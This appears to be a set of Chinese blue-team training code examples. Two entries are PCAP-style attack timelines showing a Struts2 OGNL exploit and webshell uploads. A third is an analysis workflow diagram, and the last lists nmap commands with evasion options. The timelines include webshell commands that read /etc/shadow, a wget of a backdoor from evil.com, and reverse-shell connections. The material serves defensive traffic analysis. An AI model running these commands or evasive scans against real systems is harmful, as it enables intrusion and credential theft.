    {"title":"代码示例","language":"bash","code":"时间线（从PCAP中提取）：\nt=00:00  192.168.1.100 -> 10.0.0.5:22,80,443,3306,6379 SYN扫描\nt=02:30  192.168.1.100 -> 10.0.0.5:80 GET /struts2-showcase/\nt=03:15  192.168.1.100 -> 10.0.0.5:80 POST /struts2-showcase/action (Payload含ognl表达式)\nt=03:16  10.0.0.5 -> 192.168.1.100 响应中包含 whoami 命令的执行结果: root\nt=05:00  192.168.1.100 -> 10.0.0.5:80 POST /struts2-showcase/shell.jsp (上传Webshell)\nt=05:30  192.168.1.100 -> 10.0.0.5:80 GET /struts2-showcase/shell.jsp?cmd=id\nt=06:00  192.168.1.100 -> 10.0.0.5:80 GET /struts2-showcase/shell.jsp?cmd=cat+/etc/shadow\nt=10:00  10.0.0.5 -> 192.168.1.100:4444 TCP连接 (反弹Shell)","explanation":"护网蓝队代码示例"},    {"title":"代码示例","language":"bash","code":"Wireshark(流量分析) ──→ ELK(日志分析) ──→ 告警研判 ──→ 应急响应\n       ↓                      ↓\n   理解攻击原理           理解业务行为\n       ↓                      ↓\n   写检测规则             优化告警规则","explanation":"护网蓝队代码示例"},    {"title":"代码示例","language":"bash","code":"时间轴：\nT+0s:   192.168.1.50 -> 10.0.0.10 TCP/80 GET /                   正常浏览首页\nT+5s:   192.168.1.50 -> 10.0.0.10 TCP/80 GET /admin              404返回\nT+8s:   192.168.1.50 -> 10.0.0.10 TCP/80 GET /manager            404返回\nT+10s:  192.168.1.50 -> 10.0.0.10 TCP/80 POST /login.php         200登录成功\nT+15s:  192.168.1.50 -> 10.0.0.10 TCP/80 POST /upload.php        200上传文件\nT+16s:  192.168.1.50 -> 10.0.0.10 TCP/80 GET /uploads/shell.php?cmd=id  200返回uid=33\nT+20s:  192.168.1.50 -> 10.0.0.10 TCP/80 GET /uploads/shell.php?cmd=wget+evil.com/backdoor 200\nT+25s:  10.0.0.10 -> 45.33.32.156 TCP/4444                       SYN建立连接\nT+26s:  10.0.0.10 -> 45.33.32.156 TCP/4444                       数据传输（加密）","explanation":"护网蓝队代码示例"},    {"title":"代码示例","language":"bash","code":"# 快速扫描常用端口\nnmap -F target\n\n# 扫描全部65535个端口\nnmap -p- target\n\n# 服务版本探测\nnmap -sV target\n\n# 操作系统探测\nnmap -O target\n\n# 综合扫描（版本+OS+脚本）\nnmap -A target\n\n# 躲避防火墙（分段包）\nnmap -f target\n\n# 慢速扫描（降低检测风险）\nnmap -T2 target","explanation":"护网蓝队代码示例"}
